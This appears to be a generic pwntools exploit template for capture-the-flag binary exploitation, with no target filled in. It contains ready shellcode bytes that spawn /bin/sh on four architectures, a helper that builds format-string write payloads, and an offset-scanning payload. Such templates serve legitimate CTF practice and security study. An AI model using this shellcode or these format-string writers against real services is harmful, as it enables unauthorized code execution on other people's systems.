#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = ""
PORT = 10001
ELF_PATH = ""
LIBC_PATH = ""

# setting 
context.arch = 'amd64'
#context.arch = 'i386'
#context.arch = 'arm'
#context.arch = 'aarch64'
context.os = 'linux'
context.endian = 'little'
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

elf = ELF(ELF_PATH)
libc = ELF(LIBC_PATH)

def my_recvuntil(s, delim):
    res = ""
    while delim not in res:
        c = s.recv(1)
        res += c
        sys.stdout.write(c)
        sys.stdout.flush()
    return res

def myexec(cmd):
    return subprocess.check_output(cmd, shell=True)

def sigint_handler(signum, stack):
    dbg_pid = int(myexec("ps -A | grep 'qemu-arm-static'|awk '{print $1}'").strip())
    myexec("bash -c 'kill -SIGINT %d'" % dbg_pid)

def sc(arch=context.arch):
    if arch == "i386":
        # shellcraft.i386.linux.sh(), null free, 22 bytes
        return "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x0b\x58\x99\xcd\x80"
    elif arch == "amd64":
        # shellcraft.amd64.linux.sh(), null free, 24 bytes
        return "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05"
    elif arch == "arm":
        # null free, 27 bytes
        return "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x09\x30\x49\x40\x52\x40\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
    elif arch == "aarch64":
        # 4 null bytes, total 35 bytes
        return "\x06\x00\x00\x14\xe0\x03\x1e\xaa\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xa8\x1b\x80\xd2\x21\x00\x00\xd4\xfb\xff\xff\x97\x2f\x62\x69\x6e\x2f\x73\x68"
    else:
        return None

def fmtstr(payload, prints, index, data, byte=1):
    """
    data: data that want to be written into the address
    index: stack position (ex. %7$n --> index = 7)
    prints: total charaters that have been print out
    payload: whole payload string, initial value are addresses

    ex.  payload = p32(addr) + p32(addr2) + p32(addr3)
         prints = 12
         payload, prints = fmtstr(payload, prints, 7, 0xa0a0, 2)
         payload, prints = fmtstr(payload, prints, 8, 0xc0, 1)
         payload, prints = fmtstr(payload, prints, 9, 0x08047654, 4)
    """
    if data - prints > 0:
        num = data - prints
    else:
        num = data + 256**byte - prints
        while(num <= 0):
            num += 256**byte

    payload += "%" + str(num) + "c" 
    prints = data

    if byte == 1:
        payload += "%" + str(index) + "$hhn"
    elif byte == 2:
        payload += "%" + str(index) + "$hn"
    elif byte == 4:
        payload += "%" + str(index) + "$n"
    elif byte == 8:
        payload += "%" + str(index) + "$lln"

    return payload, prints

def fmtstr_scan(cnt): # construct payload for scanning fmtstr offset
    return '.'.join( "%"+str(i)+"$p" for i in xrange(1,cnt+1))

if __name__ == "__main__":

    # if the binary is run by qemu-static
    # set the signal handler so I can send ctrl-c to qemu-static (interrupt the debbuger)
    if context.arch == "arm" or context.arch == "aarch64":
        signal.signal(signal.SIGINT, sigint_handler)   
    
    r = remote(HOST, PORT)
    #r = process(ELF_PATH)
    
    r.interactive()
